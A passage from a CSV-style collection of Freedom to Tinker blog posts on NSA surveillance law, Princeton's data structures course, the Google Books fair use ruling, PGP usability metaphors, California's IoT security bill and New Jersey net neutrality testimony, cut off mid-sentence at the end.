University to Boston University). Finally, we explore technical, legal and policy solutions that address the international surveillance loophole. We discuss why technical solutions like encryption, DNSSEC, and the RPKI can help combat these risks, but still are no panacea. Even encrypted traffic, for example, exposes metadata about which parties are communicating. Meanwhile, the NIST Cybersecurity Framework (February 2014) leaves encryption implementation to individual companies, rather than proactively creating market incentives stimulating uptake across industries. The proposed U.S.A. Freedom Act and 4th Amendment case-law concentrate on legal safeguards for “known, particular U.S. persons”, and offer little promise in closing the international surveillance loophole for Americans. We do not intend to speculate on whether or not the intelligence community is exploiting the interdependent technical and legal loopholes that we describe in this paper. Instead, our aim is to broaden our understanding of the possibilities at hand. Our analysis suggests that, without a fundamental reconsideration of the lack of privacy and due process safeguards for foreigners, current surveillance legislation opens the door for ubiquitous surveillance on Americans from abroad. Our paper combines descriptive, internal legal analysis with threat models from computer science, and offers new insights for normative policy evaluation and analytical frameworks for further research. This research is a work-in-progress and will be posted online shortly."
"293","2013-02-21","2023-03-24","https://freedom-to-tinker.com/2013/02/21/computer-science-education-done-right-a-rookies-view-from-the-front-lines-at-princeton/","In many organizations that are leaders in their field, new inductees often report being awed when they start to comprehend how sophisticated the system is compared to what they’d assumed. Engineers joining Google, for example, seem to express that feeling about the company’s internal technical architecture. Princeton’s system for teaching large undergraduate CS classes has had precisely that effect on me. I’m “teaching” COS 226 (Data Structures and Algorithms) together with Josh Hug this semester. I put that word in quotes because lecturing turns out to be a rather small, albeit highly visible part of the elaborate instructional system for these classes that’s been put in place and refined over many years. It involves nine different educational modes that students interact with and a six different types of instructional staff(!), each with a different set of roles. Let me break it down in terms of instructional staff responsibilities, which correspond roughly to learning modes. Textbook and booksite. Bob Sedgewick and Kevin Wayne, the “creator gods” of this course, wrote the excellent textbook and created the accompanying “booksite,” a very effective online complement to the book. The course is usually taught by them. Coursera. Bob did the online videos and Kevin helped develop the course, including the exercises; Josh is primarily administering it this semester. Enrollment is around 60,000! The online lectures are a vital part of the Princeton course because some of our lectures are “flipped.” Slides (and course organization). Bob and Kevin again. Josh and I do tweak the slides quite a bit for our lectures, but I for one couldn’t possibly have developed this material (or even half of it) — it would have eaten up an entire semester. The organization is extremely well thought out. For example, we hit them with Union-Find in the very first lecture. If you’ve taken a data structures and algorithms class, you’ll appreciate how unusual that is. Having seen it this way, it seems obviously the right way to teach it. Assignments and grading script. The assignments are highly effective, ensuring that students really understand how to design and analyze algorithms and translate them into code. But the real surprise to me was the grading script — while the actual grading is done by humans, the script pre-processes the submissions and finds almost all bugs, even design bugs. For example, it can (heuristically) tell if the student’s algorithm is cubic instead of quadratic by measuring running times on different inputs. It has evolved over more than a decade. Lectures. In addition to the traditional goal of conveying information, we try to use the lectures to get the students to care about the course. There’s something irreplaceable about getting 300 people in a room excited about what they’re learning, letting them feel each other’s energy and generating social proof. This is very hard to achieve, but it’s worth a shot, and we’ve succeeded at times. For example, Josh said something so inspiring in his lecture this week that the students broke out into spontaneous applause. Precepts. Decades of teaching research has established that passive transmission of information is just about the least effective learning method, and while we try to make the lectures as interactive as possible, there’s a limit. So precept is where a lot of learning happens. We have so many precepts our preceptors have their own preceptor! Every week we have a meeting where Maia Ginsburg, the lead preceptor, presents a plan for the week’s precept, which we all then implement. Maia and Josh are at the heart of what makes this course tick on a daily basis. They are dedicated teaching faculty, and I really can’t imagine running a course like this without someone at the helm for whom it’s a primary responsibility. I would be completely useless at doing their jobs. Online Q&A. There’s some member of the teaching staff (usually not me) “on call” at all times to answer student questions online on Piazza; the mean response time is a ridiculously impressive 10–15 minutes. Lab. We hire students who’ve taken the course in previous semesters and done well to hang out in the labs and help current students with programming questions. Their role is indispensable. Grading. For each assignment, Maia, with Josh’s help, develops a “grading rubric” that anticipates just about every possible error that students might make and defines how many points to deduct for each. This is another component that has gradually evolved with the course over the years; I was blown away by how much work goes into maintaining it. Office hours. Finally a learning mode where there’s no particular innovation, as far as I can see. Here’s a matrix that summarizes the division of labor. A filled square represents full responsibility and an empty square represents fewer hours devoted or implementing a rubric that’s already been developed. Computer science education is at an inflection point — the new reality that we’re quickly approaching is that everyone in college needs a few basic computer science courses, regardless of major. Some CS departments are innovating and thriving in response to this challenge, while others are feeling crushed. Let’s have a conversation about what’s being tried, what’s working and what’s not, and how we can continue to scale."
"294","2013-11-14","2023-03-24","https://freedom-to-tinker.com/2013/11/14/a-good-day-at-the-googleplex/","Judge Chin has issued his decision in the Google Book Search case, and it’s a win for Google. For those of you who have been following the litigation, it’s been a long trip through the arcana of class certification. Today’s decision, however, finally gets to the merits of Google’s fair use defense under the Copyright Act. The outcome is not surprising in light of last year’s decision in the related HathiTrust case, which held that Google’s mass digitization of books on behalf of academic libraries to facilitate scholarship and research and to aid print-disabled library patrons is fair use. The Google Books case could have come out differently, however, given that Google, unlike an academic library, is a commercial enterprise and that the service it provides through Book Search reaches far beyond an academic audience. In addition, the amount of text that Google displays in Book Search results (multiple contextual “snippets” including the search term) is greater than the amount displayed by the HathiTrust (only the page numbers and number of hits per page for the search term). Both of those factors—the commercial or non-profit nature of the use and the amount of text displayed—are relevant to the fair use analysis. A court considering the fair use defense to a claim of infringement is required by statute to analyze and weigh four factors: (1) the purpose and character of the use; (2) the nature of the copyrighted work; (3) the amount and substantiality of portion borrowed in relation to the original work as a whole; and (4) the effect of the borrowing on the market for, or value of, the original work. Courts also consider, in a more holistic way, whether the use in question furthers the underlying purpose of the copyright system to promote learning and the advancement of knowledge. With respect to the purpose and character of the use, a court considers whether the use is commercial (as opposed to non-profit) and whether it transforms the original work by either modifying the content of the original or adapting the original to a new, secondary use. The more transformative the use, the more likely it is to be fair. With respect to Book Search, Judge Chin found that Google is a commercial actor, but that fact does not disqualify Google from a finding of fair use, because Google “does not sell the scans it has made of books…; it does not sell the snippets that it displays; and it does not run ads on the About the Book pages that contain snippets.” In sum, the court concluded, “[i]t does not engage in the direct commercialization of copyrighted works.” On the question of the tranformativeness of the use, the court found that Google’s use of the scanned books is highly transformative, in large part because the service is not a service for reading books. Rather, it facilitates research and scholarship by “transform[ing] expressive text into a comprehensive word index that helps readers, scholars, researchers, and others find books.” It allows “snippets of text to act as pointers directing users to a broad selection of books.” Moreover, the court said, Google’s full-text scanning of works has enabled the development of entirely new fields of research that involve text mining and data mining. Google’s scanning and display of the snippets is not an end in itself, but a means to the very different end of enabling readers and researchers to find things they could not otherwise find in any practical way. On the second factor, the nature of the copyrighted work, a court considers whether the copyright in the original work is thin (as for non-fiction) or thick (as for fictional works, which typically contain a high degree of expressive content). Works with “thick” (i.e., strong) copyrights are entitled to a higher level of protection, meaning that less can be borrowed from them fairly. Given that millions of books were scanned and that “the vast majority of the books in Google Books are non-fiction,” Judge Chin found that the second factor, like the first, favored a finding of fair use. The third factor is the amount and substantiality of the portion borrowed. Analysis of this factor has both a quantitative and a qualitative component. The court asks not only how much was borrowed, but whether the expressive heart or core of the work was borrowed. In cases where the entire original work is copied verbatim, this factor usually tilts toward a finding of infringement.But for highly transformative uses, borrowing of the whole work is not necessarily out of bounds. Here, the court said, it was necessary to make complete, verbatim copies to accomplish the purpose of indexing:“full-work reproduction is critical to the functioning of Google Books.” As to the amount of text that Google displays in snippets, the court found it to be sufficiently limited. The first three factors, therefore, tilted toward fair use. The last factor is the effect of the borrowing on the market for the original. This factor requires consideration of whether the defendant, through its use of the original work, is providing a market substitute for the original and thereby depriving the copyright owner of revenue to which he or she is entitled. The court found that not to be the case with Google Books, because only snippets of individual works are displayed, and it would be virtually impossible for a user to cobble the snippets together into a full or coherent substitute for a copy of the original work. Not only does Google’s use not harm the market for the original scanned works, the court found, it may actually enhance the market by providing authors an opportunity to be noticed that they would not have in the world of brick-and-mortar bookstores. On top of providing the opportunity to be noticed, the court pointed out, Google provides links to online sellers from which authorized copies of scanned works can be purchased.This factor, too, weighed in favor of a finding of fair use. Not one of the four fair use factors weighed against fair use in this case, making it easy for Judge Chin to conclude that Google was entitled to summary judgment on the merits.The opinion is an efficient and complete analysis of the required factors, and I think it will hold up well on appeal. Stay tuned for the next round."
"295","2014-06-06","2023-03-24","https://freedom-to-tinker.com/2014/06/06/why-king-george-iii-can-encrypt/","[This is a guest post by Wenley Tong, Sebastian Gold, Samuel Gichohi, Mihai Roman, and Jonathan Frankle, undergraduates in the Privacy Technologies seminar that I offered for the second time in Spring 2014. They did an excellent class project on the usability of email encryption.] PGP and similar email encryption standards have existed since the early 1990s, yet even in the age of NSA surveillance and ubiquitous data-privacy concerns, we continue to send email in plain text. Researchers have attributed this apparent gaping hole in our security infrastructure to a deceivingly simple source: usability. Email encryption, although cryptographically straightforward, appears too complicated for laypeople to understand. In our project, we aimed to understand why this problem has eluded researchers for well over a decade and expand the design space of possible solutions to this and similar challenges at the intersection of security and usability. Most notably, in 1999, Alma Whitten and J. D. Tygar challenged 12 people to properly send and receive secure email using then-standard software. The resulting, now-classic paper, Why Johnny Can’t Encrypt, details the hilarious yet horrifying struggles of these participants. Whitten and Tygar concluded that the terminology of PGP, couched in metaphors coined decades earlier by cryptography researchers, was poorly integrated into the visual language of the encryption programs themselves. Users who managed to understand these metaphors still struggled to translate their knowledge into actions. In her PhD dissertation, Whitten designed her own email client with these concepts in mind, wrapping existing metaphors in a better user-interface. We hypothesized that the flaw might lie deeper, with the metaphors themselves. In PGP’s metaphors, each user posses two items, a private key and a public key. Have you inferred how the protocol works yet? Unless you have previous exposure to cryptography, likely not. Why do I have two keys? What do these keys open? Aren’t all keys private? When you want to send a message to someone, you encrypt it with his public key, which is known to everyone. The recipient can decrypt it with his private key, which only he possesses. But can’t anyone use the public key to decrypt the message again? Nope. A public key can only encrypt, not decrypt. Just trust us on that one. You’re probably starting to understand why secure email is so hard to use. Bear with us for one paragraph longer. Now that we’ve taken care of encryption, we want to ensure one more security property: authenticity. Did the message come from me or someone pretending to be me? To prove I am who I claim to be, I sign all messages I send with my private key. Wait a minute – how do you possibly sign something with a key? Finally, you can make sure my signature is valid by checking it with my public key. That’s right, you verify my signature using the same object that you use to encrypt messages you send to me. Mathematically, this makes perfect sense. Metaphor-wise, it’s a nightmare, and we haven’t even discussed key distribution or revocation. We decided to test whether better metaphors might be able to close this gap between security and usability. Specifically, we wanted metaphors that represented the cryptographic actions a user performs to send secure email and were evocative enough that users could reason about the security properties of PGP without needing to read a lengthy, technical introduction. We settled on four objects: a key, lock, seal and imprint. To send someone a message, secure it with that person’s lock. Only this recipient has the corresponding key, so only they can open it. To prove your identity, stamp the message with your seal. Since everyone knows what your seal’s imprint looks, it’s easy to verify that the message came from you. As we prepared to test our ideas on users, we discovered another advantage of our metaphor choices: the actions that they evoke make as much sense in the physical world as they do when sending secure email. We realized that these metaphors released us from having to explain PGP using the same dry, technical style of documentation that we needed to demystify public and private keys. We therefore decided to explore, not just the design space of new metaphors, but also of documentation. We captured our metaphors in the form of a fictionalized historical narrative about King George III and his colonial empire, where his system of keys, locks, seals, and imprints ensured that his letters remained safe from enemy hands: King George III set aside his quill, having completed secret orders to put down the rebellion. It was imperative that they remain secure, visible only to Generals Gage and Howe. The King opened a cabinet in the wall behind him, revealing hundreds of locks each labelled with the name of a British General. Selecting one with “Gage” engraved on the side, the King placed his orders for General Gage in an impregnable metal box and secured it shut with the lock. Since only General Gage possessed the corresponding key, the King knew that the orders were secure from prying eyes. After doing the same for General Howe, King George marked the boxes with his royal seal, whose imprint was known throughout the world. Anyone who received the message could now be sure it came from the King. Several weeks later, two metal boxes arrived on the King’s desk, one bearing the unforgeable imprint of General Gage’s seal and the other of General Howe’s. Both boxes were bound shut with locks engraved with “His Majesty King George III” on their sides. The King unlocked the boxes with his personal key, revealing two identical documents: “It is done.” This style of introduction is engaging, concise, and implicitly demonstrates the process for sending secure email by example. More interestingly, it places our metaphors in an internally-consistent fictional universe, giving users the ability to reason about the security properties of PGP beyond scenarios specifically addressed in our documentation. The natural extension of this idea might be to describe secure email in a comic strip, simultaneously introducing visual motifs from an accompanying user-interface. We put these ideas to the test by developing a quiz that measured a subject’s ability to understand and reason about secure email. We gave different groups of users various forms of documentation, stretching from a technical introduction of traditional PGP metaphors to a narrative that did little more than show our new objects in use. Our results indicated that the new metaphors themselves were no more effective than public and private keys, but that far less documentation was necessary to achieve an equivalent level of understanding (196 words in the shortest narrative in comparison to 718 for a complete introduction to PGP). Since public and private keys have no analogs in the physical world, it is impossible to apply these methods without new metaphors. Intuition suggests that shorter and more engaging instructions are more likely to be read, improving the odds that user understanding is such that PGP becomes usable. Better metaphors themselves do not directly achieve this goal, but they enable new approaches to teaching that bring usable secure email into the realm of possibility. We would like to acknowledge the many people who generously contributed their time, energy, and resources to assist in this study. Professor Lorrie Cranor shared her tremendous expertise in conducting user studies, providing advice that formed the basis of our experimentation. Professor Arvind Narayanan, in addition to teaching the class that facilitated this project and advising us at key junctures, furnished the funding that made our testing possible. Finally, our families kindly spent countless hours reviewing and copy-editing drafts of our paper in the days prior to submission."
"296","2013-10-15","2023-03-24","https://freedom-to-tinker.com/2013/10/15/u-s-citizenship-and-n-s-a-surveillance-legal-safeguard-or-practical-backdoor/","The main takeaway of two recent disclosures around N.S.A. surveillance practices, is that Americans must re-think ‘U.S. citizenship’ as the guiding legal principle to protect against untargeted surveillance of their communications. Currently, U.S. citizens may get some comfort through the usual political discourse that ‘ordinary Americans’ are protected, and this is all about foreigners. In this post, I’ll argue that this is not the case, that the legal backdoor of U.S. Citizenship is real and that relying on U.S. citizenship for protection is not in America’s interests. As a new CITP Fellow and a first time contributor to this amazing blog, I’ll introduce myself and my research interests along the way. On 14 October the Washington Post disclosed that the National Security Agency ‘collects millions of e-mail address books globally’, and on 29 September the New York Times reported that the ‘N.S.A. Gathers Data on Social Connections of U.S. Citizens’. These latest series of disclosures debunk earlier statements from senior U.S. officials that these surveillance practises are targeted at foreigners, and have little or no impact on U.S. residents; even up to President Obama. How come U.S. legal safeguards in the books don’t seem to protect Americans against such untargeted surveillance in the real world? The Foreign Intelligence Surveillance Act (‘FISA’), in particular section 702, is the talk of the day, and rightly so. It enables untargeted surveillance of ‘foreign intelligence information’ — which includes surveillance for foreign affairs-, economic- and political purposes — of non-U.S. citizens and people living outside the U.S. without any meaningful legal restriction. The aim of FISA is to provide legal safeguards for U.S. citizens and people living in the U.S. But for the N.S.A. c.s., there exist at least three ways to work around the ‘U.S. citizenship principle’: Make favorable assumptions of non-U.S. citizenship: either uphold that you are ‘51% certain’ that a data subject is non-American, or collect data outside the U.S. and assume that those data belong to foreigners. If you make such assumptions, FISA doesn’t require consultation of the Foreign Intelligence Surveillance Court for specific intelligence operations. Such practices, subsequently, go without any check and balances, even with regard to U.S. citizens. Draft favorable exemptions in minimization procedures for U.S. citizens: see section 5(2) and 5(3) of the 21 June disclosed documents and Josh Kroll’s fine analysis. For instance, regardless of citizenship, encrypted communications can be kept forever – which given the fact that HTTPS is becoming an industry standard amounts to a large portion of your communications. Circumvent local laws through international intelligence sharing: another easy work-around is to collude with an allied agency to gather intelligence information on each other’s citizens, and subsequently share the data bilaterally. This ‘quid pro quo’ principle mediates bilateral co-operation between intelligence agencies. This could well be the driving dynamic behind the TEMPORA program, in which the N.S.A. and its English equivalent GCHQ closely work together to intercept data of fiber-optics running across the Atlantic, as well as the untargeted backbone interception at ~20 Internet Exchanges around the world that NSA-whistleblower Bill Binney pointed at during a conference recently in Lausanne, which is huge, but still (for how long?) remains absent from mainstream reporting. This is the short version, detailed analysis can be found in two papers on FISA or my slides [pdf] from a recent talk that The Guardian live-blogged. I have worked on FISA for over two years now, and will continue to do so this year during my Fellowships at CITP and the Berkman Center at Harvard University, visiting from the Institute for Information Law in Amsterdam (bio and publications). A closely related topic is HTTPS governance on which my papers on several Certificate Authority breaches ask the question if regulation or other species of governance should overcome the systemic vulnerabilities of SSL/TLS and the CA ecosystem. This also ties into how untargeted interception of SSL/TLS encrypted communications is conducted in practice. I wouldn’t be surprised if we find out that the N.S.A. has its legal and technical backdoors in the SSL/TLS- and CA ecosystem protecting a great deal of our social and financial communications, which the BULLRUN disclosures by The Guardian suggest. Extrapolating from these issues, the third topic I’ll dive into is whether we need a new governance model for communications security, the subject of my very early-stage research talk at CITP on 3 October. Back to the U.S. Citizenship backdoor. Much of the societal debate has been focused on whether these programs where ‘legal’ and ‘authorized’. Currently, the only remaining meaningful obstacle against untargeted surveillance of U.S. residents is not so much in the law, and not even in the 4th Amendment of U.S. Constitution (one wonders why U.S. lawyers haven’t framed this issue more as a 1st Amendment issue of speech and associational freedom, receiving stronger protections in the U.S.). What remains is the quite trivial area of executive opportunism: ‘if this comes out, do we get away with it?’ Can our constituencies be convinced that this doesn’t impact us, but them? To be clear, several agencies in Europe have joined the bilateral party, so this is not a beauty contest between legal regimes. Nonetheless, it becomes clear that it is in America’s interest to re-think the U.S. citizenship legal criterion, that functions as a practical backdoor for untargeted surveillance of both them and us. I would argue that the question Americans of all sides of the political spectrum, notably the centre, need to ask is whether the reliance on a trivial legal safeguard and executive opportunism is sufficient when (the next) Edward Snowden illuminates another legal backdoor connected to the U.S. citizenship principle. A broader perspective on that question would also factor in the implications of this principle for the credibility of the U.S. internet freedom agenda, U.S. moral leadership in the world, U.S. business opportunities abroad and universal human rights obligations in the U.N. conventions to which the U.S. is also a party. Is the U.S. citizenship principle a tenable way forward for both Americans’ privacy, broader U.S. interests and even more broadly for a robust and trustworthy information society in the 21st century?"
"297","2013-09-13","2023-03-24","https://freedom-to-tinker.com/2013/09/13/is-the-nsa-keeping-your-encrypted-traffic-forever/","Much has been written recently about the NSA’s program to systematically defeat the encryption methods used on the internet and in other communications technologies – Project Bullrun, in the parlance of our times. We’ve learned that the NSA can read significant quantities of encrypted traffic on the web, from mobile phone networks, and on virtual private networks, which companies use to connect remote employees or offices to their corporate networks over the public Internet. Knowing this leaves me with a question: if the NSA captures and decrypts an enciphered message, how are the spoils to be handled? Does an encrypted e-mail or web session between people within the United States enjoy the same protections as an unencrypted e-mail between the same people? The surprising answer appears to be that encrypted messages get less protection! Consider the NSA’s procedures for “minimizing” (that is, deleting or redacting) information that the NSA obtains about U.S. persons when targeting non-U.S. persons. In this document, which leaked earlier in the summer, we learn about all sorts of ways the NSA can hold onto domestic communications without a warrant or court order, if they’re found in the course of targeting foreign communications. The NSA is supposed to delete all domestic communications immediately, with some specific exceptions. In particular, in the NSA’s minimization procedures, we find that “In the context of a cryptanalytic effort, maintenance of technical data bases requires retention of all communications that are enciphered or reasonably believed to contain secret meaning, and sufficient duration may consist of any period of time during which encrypted material is subject to, or of use in, cryptanalysis” (Page 5, Bullet 3(a); emphasis added). So the NSA can keep information, even about Americans, if it is “subject to … cryptanalysis.” What does this mean? A close read of the document suggests two possible interpretations. In the first interpretation, this authority might exist to support the human process of learning how to break a cryptosystem. That is, if a researcher at the NSA wants to keep some encrypted material to learn how to decipher it, then that’s allowed, even if the decrypted message turns out to be from an American. That’s the narrowest possible interpretation of the language, anyway. The second interpretation, which the EFF, among others, argued is the more natural one, reads it as allowing the NSA to keep arbitrary domestic encrypted communications. As it’s written, it appears to allow (and even to require) the NSA to keep encrypted data for a very long time. This is remarkable—if the NSA can keep encrypted messages without a warrant even if they’re purely domestic, and if the NSA can really decrypt a substantial fraction of encrypted messages, then encryption actually improves the NSA’s ability to retain and read your traffic! Indeed, it would appear that encrypting your e-mail, browsing over SSL, and doing lots of other “privacy conscious” things might well make Americans’ data more available for NSA analysis, not less! So can the NSA keep your online banking session for longer than they can keep your call records? Or can they keep the fact that you read this blog post (over HTTPS, if you read it on the original site) longer than they can keep the fact that you read a silly listicle on BuzzFeed (over HTTP)? It appears they can. Does that mean you should despair and uninstall HTTPS Everywhere? Probably not — after all, an ounce of prevention is worth a pound of FISA warrants (er, that’s the proverb, right?). We don’t yet know exactly which crypto the NSA can defeat and what leaves them stymied. But what we do know is that what initially appeared to be a small loophole in the NSA’s minimization procedures might turn out to be the legal authority to spy on almost any (encrypted) domestic communication."
"298","2018-09-21","2023-03-24","https://freedom-to-tinker.com/2018/09/21/thoughts-on-californias-proposed-connected-device-privacy-bill-sb-327/","This post was authored by Noah Apthorpe. On September 6, 2018, the California Legislature presented draft legislation to Governor Brown regarding security and authentication of Internet-connected devices. This legislation would extend California’s existing reasonable data security requirement—which already applies to online services—to Internet-connected devices. The intention of this legislation to prevent default passwords and other egregious authentication flaws is admirable, especially given the extent of documented security vulnerabilities in Internet of things (IoT) devices. Many such vulnerabilities, including default passwords and cleartext data transmissions (e.g., in IoT toys and medical devices discovered by researchers at Princeton), stem from lazy developer practices resulting in devices with minimal (or nonexistent) security or privacy protections. Such flaws could be addressed with well-known best practices that would not place excessive burden on device manufacturers. With this context in mind, we applaud California’s effort to mandate minimal security and privacy protections for connected devices. Unfortunately, as critics have pointed out, the wording of the proposed legislation is imprecise, especially regarding “reasonable security features.” Rather than reiterate this criticism, we point out some additional technical limitations of the proposed legislation, focusing on cases where the current language does not properly address security flaws as intended. We hope that these examples will help inform future improvements to this or other IoT security and privacy legislation. 1798.91.04.b.1: “The preprogrammed password is unique to each device manufactured.” Mandating unique passwords for each device still leaves room for passwords that are still easily guessable. For example, a manufacturer could assign consecutive integers as passwords to all devices and be in compliance, but such passwords could be easily enumerated by an attacker. Related problems have already occurred. In 2015, TP-LINK routers were shipped with unique WiFi passwords derived from the hardware (MAC) addresses of each device. This made it trivial to observe traffic from one of these routers and subsequently guess the WiFi password. Much research has gone into the topic of generating secure passwords, the takeaways of which should be incorporated into any default password prevention law. Ultimately, additional criteria on preprogrammed unique passwords are needed for this bill to provide the intended security benefits. 1798.91.04.b.2: “The device contains a security feature that requires a user to generate a new means of authentication before access is granted to the device for the first time.” This alternative requirement leaves open the possibility that devices or device features that users never access will not receive unique, secure passwords or other new authentication means. For example, many users never access the administrative interface of their home router (which typically has a different authentication method than the WiFi network itself). If the first login attempt is from an attacker, the attacker could receive the new authentication credentials. Additionally, this requirement does not address the potential for devices to employ otherwise insecure authentication systems that still generate new credentials upon first access. As an analogy, just because an Internet user creates a new password for each online account does not mean that each of these passwords is necessarily secure. Again, additional criteria on the authentication system are needed. 1798.91.05.b: “‘Connected device’ means any device, or other physical object that is capable of connecting to the Internet, directly or indirectly, and that is assigned an Internet Protocol address or Bluetooth address.” This extends the purview of the proposed legislation to PCs, laptops, smartphones, servers, and any other computing device that can access the Internet, even though the law is being promoted specifically as a protection for IoT devices. While we are in favor of additional security and privacy protections on all networked devices, this broad scope may prevent improvements in the specificity of future versions of the legislation which may only be applicable to IoT, mobile, or other subcategory of devices. 1798.91.06.a: “This title shall not be construed to impose any duty upon the manufacturer of a connected device related to unaffiliated third-party software or applications that a user chooses to add to a connected device.” This leaves unaddressed the complex ecosystem of third-party software that is incorporated into IoT and other Internet-connected devices before they reach the user. As an example, how does this law apply to Android smartphones for which the hardware is made by one manufacturer, the operating system is made by another (Google), and still other companies create mobile applications that come pre-loaded on the phone? The manufacturer of the hardware unlikely implements any authentication visible to the user. Instead, the operating system provides authentication for user access to the phone (usually via a PIN or a biometric fingerprint), while individual apps may have their own authentication measures. Future versions of the bill should clearly specify which criteria apply to the wide range of operating systems, applications, and software libraries from third-parties that provide core security, privacy, and authentication features for many devices. Final Thoughts Legal requirements that connected devices avoid well-known and easily fixed security flaws, such as default passwords, are long overdue. Yet, such legislation must recognize the complexity of cybersecurity issues. The above examples demonstrate the type of technical “gotchas” that can hide in well-meaning regulatory language. As California SB-327 or related legislation proceeds, we hope that legislators will consult with academic or industry researchers who have spent considerable effort developing, testing, and refining security and privacy solutions in a wide variety of technology contexts."
"299","2018-03-14","2023-03-24","https://freedom-to-tinker.com/2018/03/14/new-jersey-takes-up-net-neutrality-a-summary-and-my-experiences-as-a-witness/","On Monday afternoon, I testified before the New Jersey State Assembly Committee on Science, Technology, and Innovation, which is chaired by Assemblyman Andrew Zwicker, who also happens to represent Princeton’s district. On the committee agenda were three bills related to net neutrality. Let’s quickly review the recent events. In December 2017, the Federal Communications Commission (FCC) recently rolled back the now-famous 2015 Open Internet Order, which required Internet service providers (ISPs) to abide by several so-called “bright line” rules, which can be summarized as (1) no blocking lawful Internet traffic; (2) no throttling or degrading the performance of lawful Internet traffic; (3) no paid prioritization of one type of traffic over another; (4) transparency about network management practices that may affect the forwarding of traffic. In addition to these rules, the FCC order also re-classified Internet service as a “Title II” telecommunications service—placing it under the jurisdiction of the FCC’s rulemaking authority—overturning the previous “Title I” information services classification that ISPs previously enjoyed. The distinction of Title I vs. Title II classification is nuanced and complicated, as I’ve previously discussed. Re-classification of ISPs as a Title II service certainly comes with a host of complicated regulatory strings attached. It also places the ISPs in a different regulatory regime than the content providers (e.g., Google, Facebook, Amazon, Netflix). The rollback of the Open Internet Order reverted not only the ISPs’ classification of Title II service, but also the four “bright line rules”. In response, many states have recently been considering and enacting their own net neutrality legislation, including Washington, Oregon, California, and now New Jersey. Generally speaking, these state laws are far less complicated than the original FCC order. They typically involve re-instating the FCC’s bright-line rules, but entirely avoid the question of Title II classification. On Monday, the New Jersey State Assembly considered three bills relating to net neutrality. Essentially, all three bills amount to providing financial and other incentives to ISPs to abide by the bright line rules. The bills require ISPs to follow the bright line rules as a condition for: securing any contract with the state government (which can often be a significant revenue source); gaining access to utility poles (which is necessary for deploying infrastructure); municipal consent (which is required to occupy a city’s right-of-way). I testified at the hearing, and I also submitted written testimony, which you can read here. This was my first experience testifying before a legislative committee; it was an interesting and rewarding experience. Below, I’ll briefly summarize the hearing and my testimony (particularly in the context of the other testifying witnesses), as well as my experience as a testifying witness (complete with some lessons learned). My Testimony Before I wrote my testimony, I thought hard about what a computer scientist with my expertise could bring to the table as a testifying expert. I focused my testimony on three points: No blocking and no throttling are technically simple to implement. One of the arguments that those opposed to the legislation are making is that different state laws on blocking and throttling could become exceedingly difficult to implement, particularly if each state has its own laws. In short, the argument is that state laws could create a complex regulatory “patchwork” that is burdensome to implement. If we were considering a version of the several-hundred-page FCC’s Open Internet Order in each state, I might tend to agree. But, the New Jersey laws are simple and concise: each law is only a couple of pages. The laws basically say “don’t block or throttle lawful content”. There are clear carve-outs for illegal traffic, attack traffic, and so forth. My comments essentially focused on the simplicity of implementation, and that we need not fear a patchwork of laws if the default is a simple rule that simply prevents blocking or throttling. In my oral testimony, I added (mostly for color) that the Internet, by the way, is already a patchwork of tens of thousands of independently operated networks across hundreds of countries, and that our protocols support carrying Internet traffic over a variety of physical media, from optical networks to wireless networks to carrier pigeon. I also took the opportunity to make the point that, by the way, ISPs are in a relative sense, pretty good actors in this space right now, in contrast to other content providers who have regularly blocked access to content either for anti-competitive reasons, or as a condition for doing business in certain countries. Prioritization can be useful for certain types of traffic, but it is distinct from paid prioritization. Some ISPs have been making arguments recently that prohibiting paid prioritization would prohibit (among other things) the deployment of high-priority emergency services over the Internet. Of course, anyone who has taking an undergraduate networking course will have learned about prioritization (e.g., Weighted Fair Queueing), as well as how prioritization (and even shaping) can improve application performance, by ensuring that interactive, delay-sensitive applications such as gaming are not queued behind lower priority bulk transfers, such as a cloud backup. Yet, prioritization of certain classes of applications over others is a different matter from paid prioritization, whereby one customer might pay an ISP for higher prioritization over competing traffic. I discussed the differences at length.I also talked about how prioritization and paid prioritization could more generally: it’s not just about what a router does, but about who has access to what infrastructure. The bills address “prioritization” merely as a packet scheduling exercise—a router services one queue of packets at a faster rate than another queue. But, there are plenty of other ways that some content can be made to “go faster” than others; one such example is the deployment of content across a so-called Content Delivery Network (CDN)—a distributed network of content caches that are close to users. Some application or content providers may enjoy unfair advantage (“priority”) over others merely by virtue of the infrastructure it has access to. Today’s laws—neither the repealed FCC rules nor the state law—do not say anything about this type of prioritization, which could be applied in anti-competitive ways.Finally, I talked about how prioritization is a bit of a red herring as long as there is spare capacity. Again, in an undergraduate networking course, we talk about resource allocation concepts such as max-min fairness, where every sender gets the capacity they require as long as capacity exceeds total demand. Thus, it is also important to ensure that ISPs and application providers continue to add capacity, both in their networks and at the interconnects between their networks. Transparency is important for consumers, but figuring out exactly what ISPs should expose, in a way that’s meaningful to consumers and not unduly burdensome, is technically challenging. Consumers have a right to know about the service that they are purchasing from their ISP, as well as whether (and how well) that service can support different applications. Disclosure of network management practices and performance certainly makes good sense on the surface, but here the devil is in the details. An ISP could be very specific in disclosure. It could say, for example, that it has deployed a token bucket filter of a certain size, fill rate, and drain rate and detail the places in its network where such mechanisms are deployed. This would constitute a disclosure of a network management practice, but it would be meaningless for consumers. On the other hand, other disclosures might be so vague as to be meaningless; a statement from the ISP that says they might throttle certain types of high volume traffic a times of high demand might not be meaningful in helping a consumer figure out how certain applications might perform. In this sense, paragraph 226 of the Restoring Internet Freedom Order, which talks about consumers’ needs to understand how the network is delivering service for the applications that they care about is spot on. There’s only one problem with that provision: Technically, ISPs would have a hard time doing this without direct access to the client or server side of an application. In short: Transparency is challenging. To be continued. The Hearing and Vote The hearing itself was a interesting. There were several testifying witnesses opposing the bills: Jon Leibowitz, from Davis Polk (retained by Internet Service Providers); and a representative from US Telecom. The arguments against the bills were primarily legal and business-oriented. Essentially, the legal argument against the bills is that the states should leave this problem to the federal government. The arguments are (roughly) as follows: (1) The Restoring Internet Freedom Order prevents state pre-emption; (2) The Federal Trade Commission has this well-in-hand, now that ISPs are back in Title I territory (and as former commissioner, Leibowitz would know well the types of authority that the FTC has to bring such cases, as well as many cases they have brought against Google, Facebook, and others); (3) The state laws will create a patchwork of laws and introduce regulatory uncertainty, making it difficult for the ISPs to operate efficiently, and creating uncertainty for future investment. The arguments in opposition to the bill are orthogonal to the points I made in my own testimony. In particular, I disclaimed any legal expertise on pre-emption. I was, however, able to comment on whether I thought the second and third arguments held water from a technical perspective. While the second point about the FTC authority is mostly a legal question, I understood enough about the FTC act, and the circumstances under which they bring cases, to comment on whether technically the bills in question give consumers more power than they might otherwise have with just the FTC rules in place. My perspective was that they do, although this point is a really interesting case of the muddy distinction between technology 